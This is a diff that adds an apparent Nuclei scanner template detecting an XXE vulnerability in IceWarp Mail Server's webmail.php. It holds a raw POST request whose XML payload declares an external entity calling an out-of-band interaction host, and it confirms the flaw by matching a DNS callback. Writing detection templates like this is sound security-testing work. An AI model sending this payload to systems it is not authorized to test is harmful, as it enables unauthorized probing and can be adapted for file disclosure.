@@ -1,0 +1,26 @@
+id: icewarp-mail-server-xxe
+info:
+  name: IceWarp Mail Server XXE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: xxe,dnslog
+http:
+  - raw:
+      - |
+        POST /webmail/server/webmail.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+
+        <?xml version="1.0"?>
+        <!DOCTYPE ANY [<!ENTITY content SYSTEM "http://{{interactsh-url}}/">]>
+        <a>&content;</a>
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: word
+        part: interactsh_request
+        words:
+          - "content"
